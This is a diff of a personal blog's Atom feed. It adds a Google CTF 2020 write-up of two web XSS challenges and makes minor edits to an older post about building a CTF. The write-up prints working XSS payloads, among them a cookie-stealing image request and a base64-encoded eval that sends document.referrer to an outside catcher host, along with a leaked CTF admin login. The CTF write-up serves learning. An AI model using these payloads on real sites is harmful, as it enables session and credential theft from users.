@@ -1,4 +1,208 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.0.0">Jekyll</generator><link href="/blog/feed.xml" rel="self" type="application/atom+xml" /><link href="/blog/" rel="alternate" type="text/html" /><updated>2020-08-01T19:17:07+03:00</updated><id>/blog/feed.xml</id><title type="html">Blog</title><author><name>pop_eax</name><email>pop_eax@localhost.com</email></author><entry><title type="html">thoughts on making CTFs</title><link href="/blog/posts/ctf-writeup/web/2020/08/01/h-cktivitycon-ctf-specialorder/" rel="alternate" type="text/html" title="thoughts on making CTFs" /><published>2020-08-01T15:04:00+03:00</published><updated>2020-08-01T15:04:00+03:00</updated><id>/blog/posts/ctf-writeup/web/2020/08/01/h-cktivitycon-ctf-specialorder</id><content type="html" xml:base="/blog/posts/ctf-writeup/web/2020/08/01/h-cktivitycon-ctf-specialorder/">&lt;h1 id=&quot;special-order-hctivitycon-ctf-2020&quot;&gt;Special Order h@ctivityCon CTF 2020&lt;/h1&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.0.0">Jekyll</generator><link href="/blog/feed.xml" rel="self" type="application/atom+xml" /><link href="/blog/" rel="alternate" type="text/html" /><updated>2020-08-23T20:26:31+03:00</updated><id>/blog/feed.xml</id><title type="html">Blog</title><author><name>pop_eax</name><email>pop_eax@localhost.com</email></author><entry><title type="html">googleCTF2020 web challenges writeup</title><link href="/blog/posts/ctf-writeup/web/xss/2020/08/23/googlectf2020-pasteurize-tech-support-challenge-writeups/" rel="alternate" type="text/html" title="googleCTF2020 web challenges writeup" /><published>2020-08-23T16:28:00+03:00</published><updated>2020-08-23T16:28:00+03:00</updated><id>/blog/posts/ctf-writeup/web/xss/2020/08/23/googlectf2020-pasteurize-tech-support-challenge-writeups</id><content type="html" xml:base="/blog/posts/ctf-writeup/web/xss/2020/08/23/googlectf2020-pasteurize-tech-support-challenge-writeups/">&lt;h1 id=&quot;pasteurize&quot;&gt;PASTEURIZE&lt;/h1&gt;
+
+&lt;p&gt;this was the easiest web challenge in the CTF&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://github.com/pop-eax/blog/raw/gh-pages/images/googleCTF20/pasteurize/chall-info.png&quot; alt=&quot;decription&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;we have a paste sharing site&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://github.com/pop-eax/blog/raw/gh-pages/images/googleCTF20/pasteurize/main-site.png&quot; alt=&quot;main&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;sharing a paste, we find that we can share our pastes with the admin (TJMike)&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://github.com/pop-eax/blog/raw/gh-pages/images/googleCTF20/pasteurize/paste.png&quot; alt=&quot;paste&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;interesting&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;from what I have now, I can see that XSS is what I am supposed to look for
+&lt;br /&gt;when testing for xss I always throw this payload to see how the sanitaization is being done&lt;/p&gt;
+&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;alert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;checking the source code verifies the input is getting sanitaizied&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;while reading the source code I realized I missed that comment&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://github.com/pop-eax/blog/raw/gh-pages/images/googleCTF20/pasteurize/comment.png&quot; alt=&quot;comment&quot; /&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://github.com/pop-eax/blog/raw/gh-pages/images/googleCTF20/pasteurize/source-code.png&quot; alt=&quot;source-code&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;looking at it I was able to verify that the sanitaization is only done on client side with DOMpurify&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://github.com/pop-eax/blog/raw/gh-pages/images/googleCTF20/pasteurize/dompurify.png&quot; alt=&quot;DOMpurify&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I tried to bypass DOMpurify and read the source code, but that led to nothing since the version used in here is safe.&lt;/p&gt;
+
+&lt;p&gt;at this point I thought to myself&lt;br /&gt;
+DOMpurify shouldn’t be bypassed since it’s a really good project used everywhere
+and the high number of solves to the challenge doesn’t make me feel like we need to discover a 0day for such an easy challenge.&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;so I took it simply, and reviewd everything I have simply then an idea clicked in my mind&lt;/p&gt;
+
+&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;note&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;asdasd&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;note_id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;cb33322e-4b48-4d0f-a748-1e509be9645d&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;note_el&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;getElementById&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;note-content&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;note_url_el&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;getElementById&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;note-title&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;clean&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;DOMPurify&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sanitize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;note&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;note_el&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;innerHTML&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;clean&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;note_url_el&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;href&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;`/&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;note_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;note_url_el&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;innerHTML&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;note_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;what if we put a &lt;code class=&quot;highlighter-rouge&quot;&gt;&quot;&lt;/code&gt; in our input and get a DOM based XSS&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://github.com/pop-eax/blog/raw/gh-pages/images/googleCTF20/pasteurize/escaped.png&quot; alt=&quot;escaped&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;aaand it’s getting escaped.&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;is that the end of it then ?&lt;/em&gt;&lt;br /&gt;
+nope, it’s not I went back the server side source code and I saw something interesting&lt;/p&gt;
+
+&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cm&quot;&gt;/* Who wants a slice? */&lt;/span&gt;
+&lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;escape_string&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;unsafe&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;JSON&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;stringify&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;unsafe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;slice&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;/&amp;lt;/g&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;x3C&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;/&amp;gt;/g&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;x3E&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;the comment was interesting, when I first looked at it I felt like it’s a useless thing
+since it encodes the greater/less than signs.&lt;/p&gt;
+
+&lt;p&gt;but the comment felt odd at this point, so I tried to play with the code locally.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://github.com/pop-eax/blog/raw/gh-pages/images/googleCTF20/pasteurize/locally.png&quot; alt=&quot;locally&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;now I understood why the slice is important.
+I looked at examples online for JSON.stringify and saw that there’s only 1 case that doesn’t start with &lt;code class=&quot;highlighter-rouge&quot;&gt;&quot;&lt;/code&gt; which is when passing an object to it.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://github.com/pop-eax/blog/raw/gh-pages/images/googleCTF20/pasteurize/object.png&quot; alt=&quot;object&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I fired up burp suite and sent a json object and the quotes wasn’t there :( &lt;br /&gt;
+that’s because my input is getting passed to the backend as a string not as an object&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://github.com/pop-eax/blog/raw/gh-pages/images/googleCTF20/pasteurize/req.png&quot; alt=&quot;req&quot; /&gt;
+&lt;img src=&quot;https://github.com/pop-eax/blog/raw/gh-pages/images/googleCTF20/pasteurize/res.png&quot; alt=&quot;res&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I did some research and then I remembered that I can send raw objects with &lt;code class=&quot;highlighter-rouge&quot;&gt;param[]=thing&lt;/code&gt; in http.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://github.com/pop-eax/blog/raw/gh-pages/images/googleCTF20/pasteurize/evil-req.png&quot; alt=&quot;req&quot; /&gt;
+&lt;img src=&quot;https://github.com/pop-eax/blog/raw/gh-pages/images/googleCTF20/pasteurize/evil-res.png&quot; alt=&quot;res&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;DONE&lt;/p&gt;
+
+&lt;p&gt;crafting this payload&lt;/p&gt;
+&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;content&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;alert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;//&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://github.com/pop-eax/blog/raw/gh-pages/images/googleCTF20/pasteurize/alert.png&quot; alt=&quot;alert&quot; /&gt;
+&lt;img src=&quot;https://github.com/pop-eax/blog/raw/gh-pages/images/googleCTF20/pasteurize/alerted-source.png&quot; alt=&quot;alerted-source&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;now time to hack TJMike&lt;/p&gt;
+&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;content&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Image&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;http://domain/&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;cookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;//&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://github.com/pop-eax/blog/raw/gh-pages/images/googleCTF20/pasteurize/flag.png&quot; alt=&quot;flag&quot; /&gt;&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h1 id=&quot;tech-support&quot;&gt;TECH SUPPORT&lt;/h1&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://github.com/pop-eax/blog/raw/gh-pages/images/googleCTF20/tech-support/desc.png&quot; alt=&quot;desc&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;this challenge was fairly simple but it had a lot of rabbit holes which was really interesting.&lt;/p&gt;
+
+&lt;p&gt;the app is a normal site with a admin chat service too
+so basically it’s xss&lt;/p&gt;
+
+&lt;p&gt;we have the following features:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://github.com/pop-eax/blog/raw/gh-pages/images/googleCTF20/tech-support/features.png&quot; alt=&quot;features&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;/flag&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://github.com/pop-eax/blog/raw/gh-pages/images/googleCTF20/tech-support/flag-thing.png&quot; alt=&quot;flag-thing&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;¯\_(ツ)_/¯&lt;/p&gt;
+
+&lt;p&gt;/me (profile)&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://github.com/pop-eax/blog/raw/gh-pages/images/googleCTF20/tech-support/me.png&quot; alt=&quot;me&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;in here I updated the address with this payload&lt;/p&gt;
+
+&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;alert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;and it worked :) . &lt;br /&gt;
+but that was so useless, since it’s a self XSS and by no way the admin can access it since the address value is stored in the cookies.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;(╯°□°）╯︵ ┻━┻&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;/chat (the interesting thing)&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://github.com/pop-eax/blog/raw/gh-pages/images/googleCTF20/tech-support/chat.png&quot; alt=&quot;chat&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;now inputting the pervious payload didn’t really work
+so I tried this&lt;/p&gt;
+
+&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;img&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;src=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;X&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;onerror=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;alert(1)&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;em&gt;isn’t this another self xss ?&lt;/em&gt;&lt;br /&gt;
+I thought the same too don’t worry.&lt;/p&gt;
+
+&lt;p&gt;after submitting the form I new window popped up, which felt interesting&lt;br /&gt;
+&lt;del&gt;it’s literally useless btw&lt;/del&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://github.com/pop-eax/blog/raw/gh-pages/images/googleCTF20/tech-support/chat-window.png&quot; alt=&quot;chat&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;now I got a random thought of trying to send an legit image and to check who fetches it&lt;/p&gt;
+
+&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;img&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;src=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;domain.com&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;and I got 2 requests :)&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://github.com/pop-eax/blog/raw/gh-pages/images/googleCTF20/tech-support/reqs.png&quot; alt=&quot;reqs&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;at this point I tried to grab the /flag and send to my server and it didn’t work.&lt;br /&gt;
+after researching it I realized it’s not working because the XSS is triggering on another domain which is typeselfsub.web.ctfcompetition.com . &lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;at this point I was trying to do some weird magical stuff like SOP bypasses and I thought about redirecting to the self xss at my profile somehow &lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;&lt;em&gt;all of that is useless&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;after sending a lot of requests I thought about leaking more info from what we have&lt;br /&gt;
+so I started getting &lt;code class=&quot;highlighter-rouge&quot;&gt;document.thing&lt;/code&gt; stuff and &lt;code class=&quot;highlighter-rouge&quot;&gt;document.referrer&lt;/code&gt; returned something cool&lt;/p&gt;
+
+&lt;p&gt;the payload&lt;/p&gt;
+
+&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;img&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;src=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;X&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;onerror=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;eval(atob(&quot;d2luZG93LmxvY2F0aW9uID0gImh0dHBzOi8veG9yZWF4LmZyZWUuYmVlY2VwdG9yLmNvbS9sZWFrP3E9IiArIGRvY3VtZW50LnJlZmVycmVy&quot;))&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;spaces started messing, how the payload works so I base64 encoded it
+so I decoded it with &lt;code class=&quot;highlighter-rouge&quot;&gt;atob&lt;/code&gt; and executed it with &lt;code class=&quot;highlighter-rouge&quot;&gt;eval&lt;/code&gt;
+the decoded value&lt;/p&gt;
+
+&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;window&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;location&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;https://domain.com/leak?q=&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;referrer&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;P.S: you can base64 encode in javascript with &lt;code class=&quot;highlighter-rouge&quot;&gt;btoa&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;I got the following url from the bot&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://typeselfsub.web.ctfcompetition.com/asofdiyboxzdfasdfyryryryccc?username=mike&amp;amp;password=j9as7ya7a3636ncvx&amp;amp;reason={mypayload here}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;then I went to that url and it auto logged me as admin :P&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://github.com/pop-eax/blog/raw/gh-pages/images/googleCTF20/tech-support/admin.png&quot; alt=&quot;admin&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;now going to /flag&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://github.com/pop-eax/blog/raw/gh-pages/images/googleCTF20/tech-support/flag.png&quot; alt=&quot;flag&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;and DONE&lt;/p&gt;
+
+&lt;h2 id=&quot;references&quot;&gt;references&lt;/h2&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://portswigger.net/web-security/cross-site-scripting/&quot;&gt;xss&lt;/a&gt;&lt;br /&gt;
+tool used to get http requests &lt;a href=&quot;http://beeceptor.com/&quot;&gt;beeceptor&lt;/a&gt;&lt;/p&gt;</content><author><name>pop_eax</name></author><summary type="html">PASTEURIZE</summary></entry><entry><title type="html">thoughts on making CTFs</title><link href="/blog/posts/ctf-writeup/web/2020/08/01/h-cktivitycon-ctf-specialorder/" rel="alternate" type="text/html" title="thoughts on making CTFs" /><published>2020-08-01T15:04:00+03:00</published><updated>2020-08-01T15:04:00+03:00</updated><id>/blog/posts/ctf-writeup/web/2020/08/01/h-cktivitycon-ctf-specialorder</id><content type="html" xml:base="/blog/posts/ctf-writeup/web/2020/08/01/h-cktivitycon-ctf-specialorder/">&lt;h1 id=&quot;special-order-hctivitycon-ctf-2020&quot;&gt;Special Order h@ctivityCon CTF 2020&lt;/h1&gt;
 
 &lt;p&gt;making a big CTF challenge was always on my todo list, yes I made a couple of CTF challenges before
 but none of them actually made it to such a big event.&lt;/p&gt;
@@ -237,8 +441,8 @@ after reading more about it, I realized lxml was xxe-able by default :)&lt;/p&gt
 &lt;p&gt;&lt;strong&gt;now it’s time to ship the code and deploy&lt;/strong&gt;
 nope it’s not :P&lt;/p&gt;
 
-&lt;p&gt;I sent a message to john that it ended and he told it would be better if I dockerized to they can deploy it easily
-so now I had another task I didn’t think of&lt;/p&gt;
+&lt;p&gt;I sent a message to john that it’s done, and he told it would be better if I dockerized so they can deploy it easily
+now I had another task I didn’t think of&lt;/p&gt;
 
 &lt;p&gt;I tried to do some stuff with docker but most of them fucked up so I decided to get help from a friend who can actually
 use docker decently and plus he was working with the infra team on the CTF so I sent a message to &lt;code class=&quot;highlighter-rouge&quot;&gt;MEhrn00&lt;/code&gt; and he sent
@@ -264,8 +468,9 @@ me a basic alpine linux DockerFile&lt;/p&gt;
